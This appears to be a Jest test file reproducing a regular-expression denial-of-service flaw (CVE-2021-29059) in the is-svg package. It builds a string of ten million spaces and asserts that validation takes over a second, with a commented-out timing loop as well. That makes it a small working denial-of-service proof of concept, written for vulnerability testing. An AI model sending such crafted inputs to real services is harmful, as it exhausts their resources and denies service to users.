// function build_attack2(n) {
//     var ret = ''
//     for (var i = 0; i < n; i++) {
//     ret += ' '
//     }
    
//     return ret+"";
//     }
// for(var i = 5000000; i <= 7000000; i++) {
//    if (i % 100000 == 0) {
//        var time = Date.now();
//        var attack_str = build_attack2(i);
       

//        var time_cost = Date.now() - time;
//        console.log("attack_str.length: " + attack_str.length + ": " + time_cost+" ms")
//  }
// }

//https://github.com/yetingli/PoCs/blob/main/CVE-2021-29059/IS-SVG.md
test("ReDos in is-svg", () => {

    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const isSvg = require('is-svg');

    let attack_str = '' + genstr(10000000, ' ') + ""; 

    let t = measureTime(function () {
        let x= isSvg(attack_str);;
    });
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
});